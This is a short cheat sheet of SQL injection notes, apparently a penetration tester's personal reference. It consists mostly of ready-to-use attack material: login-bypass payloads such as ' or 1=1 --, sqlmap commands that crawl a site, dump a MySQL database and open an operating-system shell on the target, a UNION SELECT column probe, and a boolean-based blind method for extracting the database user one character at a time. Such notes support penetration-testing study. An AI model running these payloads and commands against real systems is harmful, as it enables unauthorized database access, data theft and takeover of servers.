# SQL Injection General Notes

## Testing for Bypasses: 

```sql
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```

## SQLMAP

### sqlmap crawl  

```sh
sqlmap -u http://172.21.0.0 --crawl=1
```

### sqlmap dump database  

```sh
sqlmap -u http://172.21.0.0 --dbms=mysql --dump
```

### sqlmap shell  

```sh
sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell
```

## SQLi

Testing for a row: 

```console
http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
```

## Boolean Based SQLi

`substring()` returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

- ` or substr(user(), 1, 1) = 'a` -> if true, move onto then letter:
- ` or substr(user(), 2, 1) = 'b`

Continue until username is revealed. 